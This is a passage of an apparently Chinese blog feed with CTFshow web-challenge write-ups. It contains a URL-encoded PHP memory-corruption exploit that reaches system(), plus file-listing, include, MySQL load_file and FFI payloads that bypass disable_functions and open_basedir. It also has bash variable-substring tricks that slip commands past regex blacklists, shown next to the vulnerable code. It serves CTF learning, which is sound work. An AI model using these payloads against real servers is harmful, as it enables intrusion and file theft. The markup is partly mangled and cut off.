class="hljs-number">2</span>ptr(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>php_heap<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str<span class="hljs-number">2</span>ptr(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">58</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>php_heap<span class="hljs-variable">%20</span>-<span class="hljs-variable">%200</span>xc<span class="hljs-number">8</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">60</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">70</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%206</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">60</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>xa)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>closure_obj<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str<span class="hljs-number">2</span>ptr(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>binary_leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>closure_handlers<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>get_binary_base(<span class="hljs-variable">%24</span>binary_leak)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>determine<span class="hljs-variable">%20</span>binary<span class="hljs-variable">%20</span>base<span class="hljs-variable">%20</span>address<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>elf<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>parse_elf(<span class="hljs-variable">%24</span>base)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>parse<span class="hljs-variable">%20</span>elf<span class="hljs-variable">%20</span>header<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>basic_funcs<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>get_basic_funcs(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>elf)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>get<span class="hljs-variable">%20</span>basic_functions<span class="hljs-variable">%20</span>address<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!(<span class="hljs-variable">%24</span>zif_system<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>get_system(<span class="hljs-variable">%24</span>basic_funcs)))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>couldn&#x27;t<span class="hljs-variable">%20</span>get<span class="hljs-variable">%20</span>zif_system<span class="hljs-variable">%20</span>address<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>fake_obj_offset<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span>xd<span class="hljs-number">0</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">110</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>fake_obj_offset<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>closure_obj<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i))<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>fake_obj_offset)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>xd<span class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">38</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%201</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>xd<span class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>zif_system)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>helper-<span class="hljs-variable">%3</span>eb)(<span class="hljs-variable">%24</span>cmd)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>exit()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>ctfshow(<span class="hljs-variable">%22</span>cat<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>fflag<span class="hljs-number">0</span>.txt<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>bob_end_flush()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<br></code></pre></td></tr></table></figure><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><ul><li>&#96;&#96;&#96;shell<br>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?><br>#利用脚本找到flag存放在flagc.txt中<br>#glob:&#x2F;&#x2F; 查找匹配的文件路径模式<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>- ```shell<br>  c=include(<span class="hljs-string">&#x27;/flagc.txt&#x27;</span>);<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><ul><li><pre><code class="shell">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;c=include(&#39;/flagx.txt&#39;);exit(0);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web75</span><br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>扫一遍目录发现flag在flag36.txt中</p></li><li><p>使用include发现include被open_basedir禁用</p></li><li><p>使用mysql的load_file读取文件</p></li><li><pre><code class="shell">c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;,&#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 这个脚本的意思大致揣摩就是<span class="hljs-keyword">new</span>了个本地数据库，并找到数据库中包含flag文件的库把它打印出来<br><br>- 如此骚操作，第一次见，📝<br><br><span class="hljs-comment">### web76</span><br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>扫一遍目录发现flag在flag36d.txt中</p></li><li><p>类似web75把36变36d</p></li><li><pre><code class="shell">c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;,&#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36d.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web77</span><br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>扫一遍目录发现flag在flag36x.txt中</p></li><li><p>同时注意到目录里有一个readflag</p></li><li><p>这道题使用的是FFI</p></li><li><p>FFI（Foreign Function Interface)即外部函数接口，就是在一种语言里面调另一种语言的代码技术</p></li><li><p>PHP的FFI扩展就是让你在PHP里面调用C的代码技术（只有PHP7.4以上才有）</p></li><li><pre><code class="shell">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的$ffi-&gt;system($a);//通过$ffi去调用system函数<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>- 浏览器访问/1.txt得到flag<br><br><span class="hljs-comment">### web118</span><br><br>- ```<br>  1.<span class="hljs-variable">$PATH</span> <br>  用途：可执行文件的搜索路径。<br>  用例：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>通常是bin结尾<br>  2. <span class="hljs-variable">$PWD</span><br>  用途：工作目录(你当前所在的目录)<br>  用例：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PWD</span>题目环境中肯定是/var/www/html<br>  而字母起到的作用是和0一样的<br>  结合图片组合html的l和bin的n<br>  所以<span class="hljs-variable">$&#123;PATH:~A&#125;</span>是n<span class="hljs-variable">$&#123;PWD:~A&#125;</span>是l合起来就是<span class="hljs-built_in">nl</span><br>  <span class="hljs-built_in">nl</span>命令主要是在打印内容是添加行号（Linux命令）<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;shell<br>${PATH:<del>A}${PWD:</del>A} ????.??? #再查看源码拿flag</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><br>### web119<br><br>- ban掉了<span class="hljs-type">PATH</span>和<span class="hljs-type">BASH</span><br><br>- ```shell<br>  <span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOSTNAME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;     ====&gt;   t<br>  <br>  <span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-string">$&#123;</span><span class="hljs-type">Z</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;    ====&gt;   /<br>  <br>  /bin/cat flag.php<br>  <br>  <span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-string">$&#123;</span>#&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-string">$&#123;</span>#&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOSTNAME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125; ????.???<br></code></pre></td></tr></table></figure></li></ul><h3 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h3><ul><li>&#96;&#96;&#96;php<?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST['code'])){    $code=$_POST['code'];    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){            if(strlen($code)>65){            echo '<div align="center">'.'you are so long , I dont like '.'</div>';        }        else{        echo '<div align="center">'.system($code).'</div>';        }    }    else{     echo '<div align="center">evil input</div>';    }}?><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>- ```shell<br>  code=<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>?????<span class="hljs-variable">$&#123;#RANDOM&#125;</span> ????.???<br>  /bin/base64 flag.php<br>  <span class="hljs-comment"># 最后在base64解码一下</span><br>  <span class="hljs-comment"># 多试几次</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;    <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">65</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-string">&#x27;you are so long , I dont like &#x27;</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>&#96;&#96;&#96;shell<br>code&#x3D;${PWD::$</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_爆破</title>
    <link href="/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/"/>
    <url>/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><ul><li><p>非常经典的爆破</p></li><li><p>使用BurpSuite工具</p></li><li><p><img src="https://img-blog.csdnimg.cn/1fb1610cb59d4aea9ad89deefb0bad75.png#pic_center" alt="点提交抓个包先"></p></li><li><p><img src="https://img-blog.csdnimg.cn/841473255fb0440d971ea45cbc144b84.png#pic_center" alt="对选择区域发到decoder里面发现是base64编码"></p></li><li><p>send to intruder准备爆破</p></li><li><p><img src="https://img-blog.csdnimg.cn/c0acad17193840a6b0dcad2ee03970a4.png#pic_center" alt="选择一手自定义迭代器类型的payload"></p></li><li><p><img src="https://img-blog.csdnimg.cn/2daa0d82e07e424f97b8a28e63bed4a5.png#pic_center" alt="第一个位置admin"></p></li><li><p><img src="https://img-blog.csdnimg.cn/74252d156c6840e289a274d6d8353551.png#pic_center" alt="第二个位置："></p></li><li><p><img src="https://img-blog.csdnimg.cn/22eb07eb81404610ab7c0bea1b98c2dc.png#pic_center" alt="第3个位置为下载得到的密码txt"></p></li><li><p><img src="https://img-blog.csdnimg.cn/3a67cf857e2b43cc845162d2262c69ad.png#pic_center" alt="选择编码base64和取消下面的url编码"></p></li><li><p><img 